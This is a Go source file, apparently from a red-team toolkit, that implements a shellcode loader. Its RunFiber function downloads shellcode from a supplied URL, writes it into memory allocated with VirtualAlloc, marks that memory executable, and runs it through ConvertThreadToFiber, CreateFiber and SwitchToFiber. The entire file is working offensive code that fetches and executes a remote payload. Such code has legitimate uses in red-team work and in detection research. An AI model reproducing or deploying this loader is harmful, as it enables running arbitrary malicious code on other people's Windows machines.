//References: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber */
//https://github.com/Ne0nd0g/go-shellcode */
package techniques

import (
	"github.com/sh4hin/GoPurple/helpers"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func RunFiber(url string) {
	shellcode := helpers.FetchUrl(url)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()
	if errConvertFiber != nil && errConvertFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ConvertThreadToFiber:\r\n%s", errConvertFiber.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	_, _,  errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	fiber, _, errCreateFiber := CreateFiber.Call(0, addr, 0)
	if errCreateFiber != nil && errCreateFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateFiber:\r\n%s", errCreateFiber.Error()))
	}

	_, _, errSwitchToFiber := SwitchToFiber.Call(fiber)
	if errSwitchToFiber != nil && errSwitchToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber.Error()))
	}

	_, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)
	if errSwitchToFiber2 != nil && errSwitchToFiber2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber2.Error()))
	}
}



